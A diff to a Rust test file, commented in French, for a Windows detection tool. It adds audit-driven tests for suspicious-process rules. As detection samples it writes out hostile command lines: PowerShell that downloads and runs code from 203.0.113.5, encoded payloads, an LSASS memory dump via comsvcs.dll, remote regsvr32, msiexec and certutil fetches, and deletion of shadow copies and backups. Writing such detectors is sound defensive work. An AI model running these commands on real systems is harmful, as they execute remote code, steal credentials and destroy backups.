@@ -440,6 +440,20 @@ fn prc_001_negatif() {
     assert_eq!(regle_processus(r"C:\Windows\splwow64.exe", Some("splwow64.exe 8192"), Some(WORD)), None);
 }
 
+/// Audit du 2026-11-23, A-7-8 : autres programmes qu'une macro lance pour exécuter du code (aide compilée, paquet MSI,
+/// forfiles, cmstp, odbcconf, regasm, regsvcs, msxsl), et le nouvel Outlook (olk.exe) comme document ; conhost n'est
+/// pas un interpréteur retenu (Windows le crée pour toute console : faux positif Critique)
+#[test]
+fn prc_001_interpreteurs_elargis() {
+    for exe in ["hh", "msiexec", "forfiles", "cmstp", "odbcconf", "regasm", "regsvcs", "msxsl"] {
+        let chemin = format!(r"C:\Windows\System32\{exe}.exe");
+        assert_eq!(regle_processus(&chemin, Some(&format!("{exe}.exe x")), Some(WORD)), regle_et_niveau("PRC-001", "Critique"), "{exe}");
+    }
+    let olk = r"C:\Program Files\WindowsApps\Microsoft.OutlookForWindows_1.2024.0.0_x64__8wekyb3d8bbwe\olk.exe";
+    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(olk)), regle_et_niveau("PRC-001", "Critique"));
+    assert_eq!(regle_processus(r"C:\Windows\System32\conhost.exe", Some("conhost.exe 0xffffffff -ForceV1"), Some(WORD)), None);
+}
+
 #[test]
 fn prc_002_positif() {
     let encode = format!("powershell.exe -NoP -W Hidden -enc {}", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");
@@ -448,11 +462,68 @@ fn prc_002_positif() {
                regle_et_niveau("PRC-002", "Alerte"));
 }
 
+/// Audit du 2026-11-23, A-7-1 : formes de PRC-002 manquées avant (abréviations de -EncodedCommand, iex après le
+/// téléchargement, téléchargement sans iex vers une adresse http(s)), avec le code de comportement attendu
+#[test]
+fn prc_002_formes_elargies() {
+    let b64 = "SQBFAFgA".repeat(8);
+    let cas: Vec<(String, &str)> = vec![
+        ("powershell -c \"irm https://203.0.113.5/a.ps1 | iex\"".into(), "telecharge"),
+        (format!("powershell -NoP -ec {b64}"), "obscurci"),
+        (format!("powershell -NoP -enco {b64}"), "obscurci"),
+        (format!("powershell /e {b64}"), "obscurci"),
+        (format!("powershell -e \"{b64}\""), "obscurci"),
+        (format!("pwsh -NoProfile -EncodedCommand {b64}"), "obscurci"),
+        ("powershell -c \"iwr https://203.0.113.5/a.exe -OutFile a.exe; start a.exe\"".into(), "telecharge"),
+        ("powershell -c \"Start-BitsTransfer https://203.0.113.5/a a.exe\"".into(), "telecharge"),
+        ("powershell -c \"Invoke-RestMethod -Uri http://203.0.113.5/a | Invoke-Expression\"".into(), "telecharge"),
+        ("powershell -c \"$s = iwr http://203.0.113.5/a; iex $s.Content\"".into(), "telecharge"),
+        // Décision (A-7-1) : un téléchargement en ligne de commande vers une adresse http(s) alerte, même vers un
+        // intranet et sans iex : rare sur un poste personnel, technique centrale des attaquants, niveau Alerte
+        // seulement (jamais Critique) et silencieux par une exception sur son code de comportement
+        ("powershell -c \"Invoke-WebRequest https://intranet.local/rapport.csv -OutFile r.csv\"".into(), "telecharge"),
+    ];
+    for (ligne, code) in &cas {
+        assert_eq!(regle_processus(POWERSHELL, Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-002", "Alerte"), "{ligne}");
+        assert_eq!(crate::processus::codes_prc002(ligne), [*code], "{ligne}");
+    }
+    // Les formes déjà vues restent vues
+    for ligne in [format!("powershell -NoP -enc {b64}"), "powershell -w h -c \"iex(irm https://203.0.113.5)\"".into()] {
+        assert_eq!(regle_processus(POWERSHELL, Some(&ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-002", "Alerte"), "{ligne}");
+    }
+}
+
+/// Audit du 2026-11-23, A-7-1 : copie renommée de PowerShell, reconnue par le nom d'origine du fichier (champ
+/// OriginalFileName de Sysmon 1) ; sans ce champ (4688, WMI), le nom seul ne suffit pas : limite écrite dans la fiche
+#[test]
+fn prc_002_copie_renommee_par_nom_origine() {
+    let ligne = format!(r"C:\Users\Public\p.exe -NoP -enc {}", "SQBFAFgA".repeat(8));
+    let copie = r"C:\Users\Public\p.exe";
+    let p = crate::processus::InfoProcessus::pour_test(copie, Some(&ligne), Some(EXPLORATEUR));
+    assert!(crate::processus::alerte_processus(1, &p).is_none(), "sans nom d'origine : limite déclarée");
+    for origine in ["PowerShell.EXE", "pwsh.dll"] {
+        let p = crate::processus::InfoProcessus::pour_test(copie, Some(&ligne), Some(EXPLORATEUR)).avec_nom_origine(origine);
+        let a = crate::processus::alerte_processus(1, &p).expect(origine);
+        assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.comportement.as_str()), ("PRC-002", "Alerte", "PRC-002:obscurci"), "{origine}");
+        assert_eq!(a.mitre, "T1059.001 / T1027");
+        assert!(a.raisons.contains(r"C:\Users\Public\p.exe -NoP"), "ligne montrée telle quelle : {}", a.raisons);
+    }
+    // Autre programme : rien
+    let p = crate::processus::InfoProcessus::pour_test(copie, Some(&ligne), Some(EXPLORATEUR)).avec_nom_origine("notepad.exe");
+    assert!(crate::processus::alerte_processus(1, &p).is_none());
+}
+
 #[test]
 fn prc_002_negatif() {
     // Script d'administration ordinaire ; « -enc » suivi d'un texte court (pas une charge encodée)
     assert_eq!(regle_processus(POWERSHELL, Some(r"powershell.exe -ExecutionPolicy Bypass -File C:\scripts\inventaire.ps1"), Some(EXPLORATEUR)), None);
     assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -enc UwB0AGEAcgB0AA=="), Some(EXPLORATEUR)), None);
+    // A-7-1 : nom d'une commande de téléchargement sans adresse ni iex, adresse seule sans téléchargement, paramètre en
+    // « -e… » qui n'est pas -EncodedCommand suivi d'un long texte, script lancé par -File (son contenu n'est pas lu)
+    for ligne in ["powershell -c \"Get-Help Invoke-WebRequest -Full\"", "powershell -c \"Write-Host 'voir https://learn.microsoft.com'\"",
+                  &format!("powershell -ExecutionPolicy {} -File a.ps1", "A".repeat(48)), r"powershell -File C:\scripts\maj.ps1 -Source https://intranet.local/x"] {
+        assert_eq!(regle_processus(POWERSHELL, Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
+    }
 }
 
 #[test]
@@ -468,6 +539,38 @@ fn prc_003_negatif() {
     // Usages ordinaires des mêmes outils
     assert_eq!(regle_processus(r"C:\Windows\System32\certutil.exe", Some("certutil.exe -store My"), Some(EXPLORATEUR)), None);
     assert_eq!(regle_processus(r"C:\Windows\System32\rundll32.exe", Some(r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"), Some(EXPLORATEUR)), None);
+    // A-7-7 : DLL d'un dossier du système, paquet MSI local ou sur un partage (déploiement d'entreprise ordinaire),
+    // regsvr32 d'une DLL installée, mshta d'un fichier local
+    for (exe, ligne) in [("rundll32", "rundll32 shell32.dll,Control_RunDLL"), ("msiexec", r"msiexec /i C:\Temp\a.msi /qn"),
+                         ("msiexec", r"msiexec /i \\serveur\deploiement\app.msi /qn"), ("regsvr32", r#"regsvr32 /s "C:\Program Files\Editeur\module.dll""#),
+                         ("certutil", "certutil -verifyctl AuthRoot"), ("rundll32", r"rundll32.exe C:\Windows\System32\comsvcs.dll,ServiceMain")] {
+        assert_eq!(regle_processus(&format!(r"C:\Windows\System32\{exe}.exe"), Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
+    }
+}
+
+/// Audit du 2026-11-23, A-7-7 : formes de PRC-003 manquées avant, avec l'outil (code de comportement), la technique et
+/// le niveau : le vidage de la mémoire de LSASS par comsvcs.dll est un signal fort (Critique, jamais adouci)
+#[test]
+fn prc_003_formes_elargies() {
+    let cas = [
+        (r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\l.dmp full", "comsvcs", "T1003.001", "Critique"),
+        (r"rundll32 comsvcs.dll #24 624 C:\Users\Public\l.dmp full", "comsvcs", "T1003.001", "Critique"),
+        (r"rundll32.exe C:\Users\Public\x.dll,DllRegisterServer", "rundll32_dll", "T1218.011", "Alerte"),
+        (r#"rundll32.exe "C:\Users\x\AppData\Roaming\a b\x.dll",Start"#, "rundll32_dll", "T1218.011", "Alerte"),
+        (r"rundll32 C:\ProgramData\x.dll,Run", "rundll32_dll", "T1218.011", "Alerte"),
+        ("msiexec /q /i http://203.0.113.5/a.msi", "msiexec", "T1218.007", "Alerte"),
+        (r"mshta \\hote\partage\a.hta", "mshta", "T1218", "Alerte"),
+        (r"regsvr32 /s /n /u /i:\\hote\s\f.sct scrobj.dll", "regsvr32", "T1218", "Alerte"),
+        ("regsvr32 -s -i:http://203.0.113.5/f.sct scrobj.dll", "regsvr32", "T1218", "Alerte"),
+        ("certutil -verifyctl -f -split http://203.0.113.5/a.exe", "certutil", "T1105", "Alerte"),
+    ];
+    for (ligne, outil, technique, niveau) in cas {
+        let p = crate::processus::InfoProcessus::pour_test(r"C:\Windows\System32\rundll32.exe", Some(ligne), Some(EXPLORATEUR));
+        let a = crate::processus::alerte_processus(1, &p).unwrap_or_else(|| panic!("{ligne}"));
+        assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("PRC-003", niveau), "{ligne}");
+        assert_eq!(a.comportement, format!("PRC-003:{outil}"), "{ligne}");
+        assert_eq!(a.mitre, technique, "{ligne}");
+    }
 }
 
 #[test]
@@ -484,6 +587,25 @@ fn prc_004_negatif() {
                                Some(r#""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe" --remote-debugging-port=0"#), Some(EXPLORATEUR)), None);
     assert_eq!(regle_processus(r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                                Some(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default"#), Some(EXPLORATEUR)), None);
+    // A-7-9 : Firefox n'est pas retenu (ses cookies se lisent sur le disque sans débogage ; débogage surtout par les
+    // outils de test) ; un browser.exe hors du dossier de Yandex non plus (nom trop générique)
+    for ligne in [r#""C:\Program Files\Mozilla Firefox\firefox.exe" --remote-debugging-port 9222"#, r"C:\Outils\browser.exe --remote-debugging-port=9222",
+                  r#""C:\Program Files\Vivaldi\Application\vivaldi.exe" --profile-directory=Default"#] {
+        assert_eq!(regle_processus(r"C:\x.exe", Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
+    }
+}
+
+/// Audit du 2026-11-23, A-7-9 : autres navigateurs Chromium (Vivaldi, Opera, Yandex, Arc ; Chromium s'appelle
+/// chrome.exe) lancés en débogage à distance
+#[test]
+fn prc_004_navigateurs_chromium() {
+    for ligne in [r#""C:\Users\x\AppData\Local\Vivaldi\Application\vivaldi.exe" --remote-debugging-port=9222"#,
+                  r"C:\Users\x\AppData\Local\Programs\Opera\opera.exe --remote-debugging-port=9222 --headless",
+                  r"C:\Users\x\AppData\Local\Yandex\YandexBrowser\Application\browser.exe --remote-debugging-pipe",
+                  r#""C:\Program Files\WindowsApps\TheBrowserCompany.Arc_1.0.0.0_x64__ttt1ap7aakyb4\Arc.exe" --remote-debugging-port=9222"#,
+                  r"C:\Users\x\AppData\Local\Chromium\Application\chrome.exe --remote-debugging-port=0"] {
+        assert_eq!(regle_processus(r"C:\x.exe", Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-004", "Alerte"), "{ligne}");
+    }
 }
 
 #[test]
@@ -492,6 +614,14 @@ fn prc_005_positif() {
                regle_et_niveau("PRC-005", "Critique"));
     assert_eq!(regle_processus(r"C:\Windows\System32\bcdedit.exe", Some("bcdedit /set {default} recoveryenabled No"), Some(EXPLORATEUR)),
                regle_et_niveau("PRC-005", "Critique"));
+    // Audit du 2026-11-23, A-7-3 : autres façons de supprimer les clichés ou les sauvegardes
+    for ligne in ["powershell -c \"Get-WmiObject Win32_ShadowCopy | Remove-WmiObject\"", "powershell -c \"Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\"",
+                  "powershell -c \"gwmi win32_shadowcopy | foreach { $_.Delete() }\"",
+                  "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB", "wbadmin delete backup -keepVersions:0 -quiet",
+                  "bcdedit /set {default} bootstatuspolicy ignoreallfailures", "diskshadow delete shadows all",
+                  "cmd /c \"echo delete shadows all > s.txt & diskshadow /s s.txt\""] {
+        assert_eq!(regle_processus(r"C:\Windows\System32\cmd.exe", Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-005", "Critique"), "{ligne}");
+    }
     // Ancien faux négatif (fiche, avant la PR 3.7) : un motif PowerShell plus tôt dans la ligne ne masque plus la suppression
     // des sauvegardes, qui donne la règle et le niveau
     let p = crate::processus::InfoProcessus::pour_test(POWERSHELL,
@@ -506,20 +636,77 @@ fn prc_005_negatif() {
     // Lecture des clichés, sans suppression
     assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin.exe list shadows"), Some(EXPLORATEUR)), None);
     assert_eq!(regle_processus(r"C:\Windows\System32\wbadmin.exe", Some("wbadmin get versions"), Some(EXPLORATEUR)), None);
+    // A-7-3 : lecture des clichés par WMI, agrandissement de l'espace des clichés, diskshadow sur un script seul (son
+    // contenu n'est pas lu : la ligne ne dit pas s'il supprime), politique de démarrage ordinaire
+    for ligne in ["powershell -c \"Get-WmiObject Win32_ShadowCopy | Select-Object ID,InstallDate\"", "vssadmin list shadowstorage",
+                  "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=20%", "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=UNBOUNDED",
+                  "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=50GB",
+                  "diskshadow /s sauvegarde.txt", "diskshadow list shadows all", "bcdedit /set {default} bootstatuspolicy displayallfailures"] {
+        assert_eq!(regle_processus(r"C:\Windows\System32\cmd.exe", Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
+    }
 }
 
 // ------------------------------------------------------------ CHA : chaînes de processus (PR 3.7)
 // chaines::Arbre sur une liste de processus synthétique : explorer → cmd → powershell → certutil
 
 fn arbre_de_test() -> crate::chaines::Arbre {
+    let explorateur = format!(r"{}\explorer.exe", crate::natif::dossier_windows());
+    arbre_avec_chemins(&[(100, "explorer", 4), (200, "cmd", 100), (300, "powershell", 200), (400, "certutil", 300), (500, "notepad", 100)],
+                       &[(100, &explorateur)])
+}
+
+/// Arbre synthétique (pid, nom, parent) et chemins des programmes lus (pid, chemin) ; un pid absent n'a pas de chemin lu
+fn arbre_avec_chemins(processus: &[(u32, &str, u32)], chemins: &[(u32, &str)]) -> crate::chaines::Arbre {
     use crate::natif::InfoListe;
     let mut arbre = crate::chaines::Arbre::default();
-    let liste: std::collections::HashMap<u32, InfoListe> = [
-        (100, ("explorer", 4)), (200, ("cmd", 100)), (300, ("powershell", 200)), (400, ("certutil", 300)),
-        (500, ("notepad", 100)),
-    ].into_iter().map(|(pid, (nom, parent))| (pid, InfoListe { nom: nom.into(), parent })).collect();
-    arbre.maj(&liste);
+    let liste: std::collections::HashMap<u32, InfoListe> =
+        processus.iter().map(|&(pid, nom, parent)| (pid, InfoListe { nom: nom.into(), parent })).collect();
+    let chemins: std::collections::HashMap<u32, String> = chemins.iter().map(|&(p, c)| (p, c.to_string())).collect();
+    arbre.maj_avec(&liste, &|pid| chemins.get(&pid).cloned().unwrap_or_default());
     arbre
+}
+
+/// Audit du 2026-11-23, A-7-5 : un parent n'est une racine que par le chemin exact du programme système sous le dossier
+/// Windows. Un svchost.exe ou taskhostw.exe dans un dossier temporaire qui lance deux étapes signalées : une chaîne,
+/// une alerte Critique (avant : coupée en deux chaînes de 5 et 7, aucune alerte)
+#[test]
+fn cha_001_racine_par_chemin() {
+    let dossier = crate::natif::dossier_windows();
+    let explorateur = format!(r"{dossier}\explorer.exe");
+    let svchost = format!(r"{dossier}\System32\svchost.exe");
+    for (nom, chemin) in [("svchost", r"C:\Users\x\AppData\Local\Temp\svchost.exe"), ("taskhostw", r"C:\Users\Public\taskhostw.exe")] {
+        let mut arbre = arbre_avec_chemins(&[(100, "explorer", 4), (200, nom, 100), (300, "cmd", 200), (400, "certutil", 200)],
+                                           &[(100, &explorateur), (200, chemin)]);
+        arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
+        arbre.signaler(400, 7, "connexion vers une adresse inconnue");
+        let chaines = arbre.chaines();
+        assert_eq!(chaines.len(), 1, "{chemin}");
+        assert_eq!(chaines[0].racine, nom);
+        let a = arbre.alertes(&chaines);
+        assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str(), a.score)).collect::<Vec<_>>(), [("CHA-001", "Critique", 12)], "{chemin}");
+    }
+    // Le vrai programme système (chemin exact sous le dossier Windows) et l'Explorateur réel restent des racines : deux
+    // étapes sans lien que leur lanceur ne forment pas une chaîne
+    for lanceur in [200, 100] {
+        let mut arbre = arbre_avec_chemins(&[(100, "explorer", 4), (200, "svchost", 100), (300, "cmd", lanceur), (400, "certutil", lanceur)],
+                                           &[(100, &explorateur), (200, &svchost)]);
+        arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
+        arbre.signaler(400, 7, "connexion vers une adresse inconnue");
+        let chaines = arbre.chaines();
+        assert_eq!(chaines.len(), 2, "lanceur {lanceur}");
+        assert!(arbre.alertes(&chaines).is_empty(), "lanceur {lanceur}");
+    }
+    // Un nom système dans un autre dossier de Windows (pas le chemin exact) n'est pas une racine
+    let tasks = format!(r"{dossier}\Tasks\svchost.exe");
+    let mut arbre = arbre_avec_chemins(&[(200, "svchost", 4), (300, "cmd", 200), (400, "certutil", 200)], &[(200, &tasks)]);
+    arbre.signaler(300, 5, "a");
+    arbre.signaler(400, 7, "b");
+    assert_eq!(arbre.chaines().len(), 1);
+    // Chemin inconnu (illisible) : pas une racine, sens prudent (la chaîne continue)
+    let mut arbre = arbre_avec_chemins(&[(100, "explorer", 4), (300, "cmd", 100), (400, "certutil", 100)], &[]);
+    arbre.signaler(300, 5, "a");
+    arbre.signaler(400, 7, "b");
+    assert_eq!(arbre.chaines().len(), 1);
 }
 
 #[test]
